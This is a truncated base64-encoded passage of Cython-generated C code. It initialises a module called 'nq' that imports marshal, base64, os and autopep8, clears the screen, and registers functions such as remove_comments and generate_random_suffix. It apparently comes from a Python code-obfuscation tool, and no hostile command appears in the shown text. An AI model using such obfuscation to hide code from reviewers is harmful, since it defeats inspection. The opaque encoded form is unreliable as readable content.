X3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9jeXRob25fcnVudGltZSA9IF9fUHl4X1B5SW1wb3J0X0FkZE1vZHVsZVJlZigiY3l0aG9uX3J1bnRpbWUiKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2N5dGhvbl9ydW50aW1lKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoUHlPYmplY3RfU2V0QXR0clN0cmluZyhfX3B5eF9tLCAiX19idWlsdGluc19fIiwgX19weXhfbXN0YXRlLT5fX3B5eF9iKSA8IDApIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgXG4gICNpZiBDWVRIT05fUkVGTkFOTllcbl9fUHl4X1JlZk5hbm55ID0gX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoInJlZm5hbm55Iik7XG5pZiAoIV9fUHl4X1JlZk5hbm55KSB7XG4gIFB5RXJyX0NsZWFyKCk7XG4gIF9fUHl4X1JlZk5hbm55ID0gX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoIkN5dGhvbi5SdW50aW1lLnJlZm5hbm55Iik7XG4gIGlmICghX19QeXhfUmVmTmFubnkpXG4gICAgICBQeV9GYXRhbEVycm9yKCJmYWlsZWQgdG8gaW1wb3J0IFwncmVmbmFubnlcJyBtb2R1bGUiKTtcbn1cbiNlbmRpZlxuXG5fX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiUHlJbml0X25xIiwgMCk7XG4gIGlmIChfX1B5eF9jaGVja19iaW5hcnlfdmVyc2lvbihfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYLCBfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKCksIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gICNpZmRlZiBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0c1xuICBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0cygpO1xuICAjZW5kaWZcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV90dXBsZSA9IFB5VHVwbGVfTmV3KDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfdHVwbGUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKCIiLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X2J5dGVzKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X3VuaWNvZGUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoIiIsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfdW5pY29kZSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgXG4gIGlmIChfX1B5eF9Jbml0Q29uc3RhbnRzKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgc3RyaW5ndGFiX2luaXRpYWxpemVkID0gMTtcbiAgaWYgKF9fUHl4X0luaXRHbG9iYWxzKCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgI2lmIDAgfHwgZGVmaW5lZChfX1B5eF9DeUZ1bmN0aW9uX1VTRUQpIHx8IGRlZmluZWQoX19QeXhfRnVzZWRGdW5jdGlvbl9VU0VEKSB8fCBkZWZpbmVkKF9fUHl4X0Nvcm91dGluZV9VU0VEKSB8fCBkZWZpbmVkKF9fUHl4X0dlbmVyYXRvcl9VU0VEKSB8fCBkZWZpbmVkKF9fUHl4X0FzeW5jR2VuX1VTRUQpXG4gIGlmIChfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19pbml0KF9fcHl4X20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gICNlbmRpZlxuICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VEXG4gIGlmIChfX3B5eF9DeUZ1bmN0aW9uX2luaXQoX19weXhfbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gICNpZmRlZiBfX1B5eF9GdXNlZEZ1bmN0aW9uX1VTRURcbiAgaWYgKF9fcHl4X0Z1c2VkRnVuY3Rpb25faW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gIGlmIChfX3B5eF9Db3JvdXRpbmVfaW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VEXG4gIGlmIChfX3B5eF9HZW5lcmF0b3JfaW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRURcbiAgaWYgKF9fcHl4X0FzeW5jR2VuX2luaXQoX19weXhfbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgI2VuZGlmXG4gIFxuICBpZiAoX19weXhfbW9kdWxlX2lzX21haW5fbnEpIHtcbiAgICBpZiAoUHlPYmplY3RfU2V0QXR0cihfX3B5eF9tLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmFtZV8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbWFpbikgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgfVxuICB7XG4gICAgUHlPYmplY3QgKm1vZHVsZXMgPSBQeUltcG9ydF9HZXRNb2R1bGVEaWN0KCk7IGlmICh1bmxpa2VseSghbW9kdWxlcykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBpZiAoIVB5RGljdF9HZXRJdGVtU3RyaW5nKG1vZHVsZXMsICJucSIpKSB7XG4gICAgICBpZiAodW5saWtlbHkoKFB5RGljdF9TZXRJdGVtU3RyaW5nKG1vZHVsZXMsICJucSIsIF9fcHl4X20pIDwgMCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gICAgfVxuICB9XG4gIFxuICBpZiAoX19QeXhfSW5pdENhY2hlZEJ1aWx0aW5zKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgXG4gIGlmIChfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgaWYgKF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RzKF9fcHl4X21zdGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgXG4gICh2b2lkKV9fUHl4X21vZGluaXRfZ2xvYmFsX2luaXRfY29kZShfX3B5eF9tc3RhdGUpO1xuICAodm9pZClfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7XG4gICh2b2lkKV9fUHl4X21vZGluaXRfZnVuY3Rpb25fZXhwb3J0X2NvZGUoX19weXhfbXN0YXRlKTtcbiAgaWYgKHVubGlrZWx5KChfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZSkgPCAwKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgKHZvaWQpX19QeXhfbW9kaW5pdF90eXBlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7XG4gICh2b2lkKV9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRlKTtcbiAgKHZvaWQpX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGUpO1xuICBcblxuICBcbiAgX19weXhfdF8yID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lLCBfX3B5eF90XzIsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hdXRvcGVwOCwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hdXRvcGVwOCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tYXJzaGFsLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21hcnNoYWwsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2h1dGlsLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NodXRpbCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0cmluZywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdHJpbmcsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFzZTY0LCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Jhc2U2NCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fcHl4X3RfNiA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xlYXJ9O1xuICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTAsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ybnFfMWdlbmVyYXRlX3JhbmRvbV9zdWZmaXgsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5lcmF0ZV9yYW5kb21fc3VmZml4LCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbnEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsyXSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzVHVwbGUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJucV8zZ3csIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ndywgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbM10pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ndywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJucV81cmVtb3ZlX2NvbW1lbnRzLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVtb3ZlX2NvbW1lbnRzLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbnEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls0XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyNCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlbW92ZV9jb21tZW50cywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJucV83ZywgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2csIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ucSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzVdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQ2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Rlc3QsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG5cbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7XG4gIGlmIChfX3B5eF9tKSB7XG4gICAgaWYgKF9fcHl4X21zdGF0ZS0+X19weXhfZCAmJiBzdHJpbmd0YWJfaW5pdGlhbGl6ZWQpIHtcbiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiaW5pdCBucSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgIH1cbiAgICAjaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gICAgUHlfQ0xFQVIoX19weXhfbSk7XG4gICAgI2Vsc2VcbiAgICBQeV9ERUNSRUYoX19weXhfbSk7XG4gICAgaWYgKHB5c3RhdGVfYWRkbW9kdWxlX3J1bikge1xuICAgICAgUHlPYmplY3QgKnRwLCAqdmFsdWUsICp0YjtcbiAgICAgIFB5RXJyX0ZldGNoKCZ0cCwgJnZhbHVlLCAmdGIpO1xuICAgICAgUHlTdGF0ZV9SZW1vdmVNb2R1bGUoJl9fcHl4X21vZHVsZWRlZik7XG4gICAgICBQeUVycl9SZXN0b3JlKHRwLCB2YWx1ZSwgdGIpO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgfSBlbHNlIGlmICghUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19JbXBvcnRFcnJvciwgImluaXQgbnEiKTtcbiAgfVxuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gIHJldHVybiAoX19weXhfbSAhPSBOVUxMKSA/IDAgOiAtMTtcbiAgI2Vsc2VcbiAgcmV0dXJuIF9fcHl4X207XG4gICNlbmRpZlxufVxuXG5cbnR5cGVkZWYgc3RydWN0IHtcbiAgICBjb25zdCBjaGFyICpzO1xuI2lmIDcwIDw9IDY1NTM1XG4gICAgY29uc3QgdW5zaWduZWQgc2hvcnQgbjtcbiNlbGlmIDcwIC8gMiA8IElOVF9NQVhcbiAgICBjb25zdCB1bnNpZ25lZCBpbnQgbjtcbiNlbGlmIDcwIC8gMiA8IExPTkdfTUFYXG4gICAgY29uc3QgdW5zaWduZWQgbG9uZyBuO1xuI2Vsc2VcbiAgICBjb25zdCBQeV9zc2l6ZV90IG47XG4jZW5kaWZcbiNpZiAxIDw9IDMxXG4gICAgY29uc3QgdW5zaWduZWQgaW50IGVuY29kaW5nIDogNTtcbiNlbGlmIDEgPD0gMjU1XG4gICAgY29uc3QgdW5zaWduZWQgY2hhciBlbmNvZGluZztcbiNlbGlmIDEgPD0gNjU1MzVcbiAgICBjb25zdCB1bnNpZ25lZCBzaG9ydCBlbmNvZGluZztcbiNlbHNlXG4gICAgY29uc3QgUHlfc3NpemVfdCBlbmNvZGluZztcbiNlbmRpZlxuICAgIGNvbnN0IHVuc2lnbmVkIGludCBpc191bmljb2RlIDogMTtcbiAgICBjb25zdCB1bnNpZ25lZCBpbnQgaW50ZXJuIDogMTtcbn0gX19QeXhfU3RyaW5nVGFiRW50cnk7XG5zdGF0aWMgY29uc3QgY2hhciAqIGNvbnN0IF9fcHl4X3N0cmluZ190YWJfZW5jb2RpbmdzW10gPSB7IDAgfTtcbnN0YXRpYyBjb25zdCBfX1B5eF9TdHJpbmdUYWJFbnRyeSBfX3B5eF9zdHJpbmdfdGFiW10gPSB7XG4gIHtfX3B5eF9rXywgc2